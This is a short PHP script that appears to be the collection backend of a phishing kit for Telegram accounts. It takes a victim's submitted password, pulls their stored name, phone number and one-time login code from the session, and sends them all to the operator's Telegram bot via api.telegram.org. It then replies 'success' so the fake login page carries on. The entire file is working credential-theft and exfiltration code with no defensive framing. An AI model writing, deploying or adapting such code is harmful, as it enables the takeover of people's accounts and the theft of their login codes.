<?php
session_start();
header("Content-Type: application/json");

$input = json_decode(file_get_contents("php://input"), true);
$password = !empty($input['password']) ? htmlspecialchars($input['password']) : '-';
$_SESSION['password'] = $password;

include 'telegram.php';
$name = $_SESSION['name'] ?? '-';
$phone = $_SESSION['phone'] ?? '-';
$otp = $_SESSION['otp'] ?? '-';

$message = "*Data Telegram Masuk*\nNama : $name\nNomor : $phone\nOTP : $otp\nPassword : $password";
$url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatID&text=" . urlencode($message) . "&parse_mode=Markdown";
@file_get_contents($url);

echo json_encode(["status" => "success"]);